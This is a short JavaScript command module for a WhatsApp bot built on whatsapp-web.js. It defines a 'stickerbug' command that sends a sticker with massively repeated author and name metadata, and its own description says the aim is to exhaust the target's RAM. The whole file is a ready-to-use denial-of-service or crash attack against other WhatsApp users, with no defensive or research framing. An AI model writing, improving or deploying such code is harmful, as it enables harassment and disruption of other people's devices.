const { MessageMedia } = require('whatsapp-web.js');

module.exports = {
    name: 'stickerbug',
    description: 'Deploy a metadata-bloated sticker to exhaust target RAM',
    async execute(client, message, args) {
        // A valid 1x1 transparent pixel in Base64 (This avoids the RIFF error)
        const validWebP = "UklGRhoAAABXRUJQVlA4TA0AAAAvAAAAEAcQERGIiP4HAA==";
        const media = new MessageMedia('image/webp', validWebP, 'bug.webp');

        await client.sendMessage(message.from, media, {
            sendMediaAsSticker: true,
            stickerAuthor: "ZARA_EXPLOIT".repeat(2000), // Massive metadata
            stickerName: "CRASH_DATA".repeat(2000)
        });

        await message.reply("🚀 *STICKER BOMB SENT:* Metadata overflow injected.");
    }
};